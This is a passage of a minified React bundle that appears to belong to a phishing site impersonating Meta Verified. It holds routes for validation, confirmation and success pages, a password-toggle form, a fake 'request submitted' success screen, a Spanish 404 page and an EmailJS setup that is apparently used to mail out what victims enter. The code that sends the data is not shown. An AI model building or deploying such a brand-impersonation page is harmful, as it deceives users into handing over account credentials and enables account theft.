                                            className: "absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700",
                                            children: n ? g.jsx(kb, {
                                                size: 18
                                            }) : g.jsx(Tb, {
                                                size: 18
                                            })
                                        })]
                                    })
                                }), g.jsx(Ni, {
                                    className: "text-xs text-red-500 mt-1"
                                })]
                            })
                        }), g.jsx(Es, {
                            type: "submit",
                            className: "w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200",
                            disabled: o,
                            children: o ? "Submitting..." : "Submit"
                        })]
                    })
                })]
            })
        })]
    })
}
const mp = h.forwardRef( ({className: e, ...t}, n) => g.jsx("div", {
    ref: n,
    className: ve("rounded-lg border bg-card text-card-foreground shadow-sm", e),
    ...t
}));
mp.displayName = "Card";
const U0 = h.forwardRef( ({className: e, ...t}, n) => g.jsx("div", {
    ref: n,
    className: ve("flex flex-col space-y-1.5 p-6", e),
    ...t
}));
U0.displayName = "CardHeader";
const B0 = h.forwardRef( ({className: e, ...t}, n) => g.jsx("h3", {
    ref: n,
    className: ve("text-2xl font-semibold leading-none tracking-tight", e),
    ...t
}));
B0.displayName = "CardTitle";
const nA = h.forwardRef( ({className: e, ...t}, n) => g.jsx("p", {
    ref: n,
    className: ve("text-sm text-muted-foreground", e),
    ...t
}));
nA.displayName = "CardDescription";
const vp = h.forwardRef( ({className: e, ...t}, n) => g.jsx("div", {
    ref: n,
    className: ve("p-6 pt-0", e),
    ...t
}));
vp.displayName = "CardContent";
const rA = h.forwardRef( ({className: e, ...t}, n) => g.jsx("div", {
    ref: n,
    className: ve("flex items-center p-6 pt-0", e),
    ...t
}));
rA.displayName = "CardFooter";
function oA() {
    const [e,t] = Mf();
    return g.jsxs(g.Fragment, {
        children: [g.jsx(qf, {
            title: "Meta Verified | Success",
            description: "Your verification request has been submitted successfully"
        }), g.jsx("div", {
            className: "min-h-screen flex items-center justify-center bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5 p-4",
            children: g.jsxs(mp, {
                className: "max-w-lg w-full bg-white/90 backdrop-blur-sm border-white/20 shadow-lg",
                children: [g.jsxs(U0, {
                    className: "text-center",
                    children: [g.jsx(Cb, {
                        className: "w-16 h-16 mx-auto text-[#0180FA] mb-4"
                    }), g.jsx(B0, {
                        className: "text-3xl font-bold text-[#1c1e21]",
                        children: "Success!"
                    })]
                }), g.jsxs(vp, {
                    className: "text-center space-y-4",
                    children: [g.jsx("p", {
                        className: "text-[#65676B]",
                        children: "Your verification request has been submitted successfully. We will review your application and get back to you soon."
                    }), g.jsx(Es, {
                        onClick: () => t("/"),
                        className: "w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-2 px-4 rounded-md text-sm transition-colors duration-200 shadow-md",
                        children: "Return Home"
                    })]
                })]
            })
        })]
    })
}
function sA() {
    return g.jsx("div", {
        className: "min-h-screen w-full flex items-center justify-center bg-gray-50",
        children: g.jsx(mp, {
            className: "w-full max-w-md mx-4",
            children: g.jsxs(vp, {
                className: "pt-6",
                children: [g.jsxs("div", {
                    className: "flex mb-4 gap-2",
                    children: [g.jsx(bb, {
                        className: "h-8 w-8 text-red-500"
                    }), g.jsx("h1", {
                        className: "text-2xl font-bold text-gray-900",
                        children: "404 - Página No Encontrada"
                    })]
                }), g.jsx("p", {
                    className: "mt-4 text-sm text-gray-600",
                    children: "La página que está buscando no existe."
                })]
            })
        })
    })
}
function iA() {
    return g.jsxs(G_, {
        children: [g.jsx(Is, {
            path: "/",
            component: mC
        }), g.jsx(Is, {
            path: "/validation",
            component: uN
        }), g.jsx(Is, {
            path: "/confirmation",
            component: tA
        }), g.jsx(Is, {
            path: "/success",
            component: oA
        }), g.jsx(Is, {
            component: sA
        })]
    })
}
function aA() {
    return h.useEffect( () => {
        try {
            iN()
        } catch (e) {
            console.error("Failed to initialize EmailJS:", e)
        }
    }
    , []),
    g.jsxs(xE, {
        client: EE,
        children: [g.jsx(iA, {}), g.jsx(pC, {})]
    })
}
Jg(document.getElementById("root")).render(g.jsx(aA, {}));
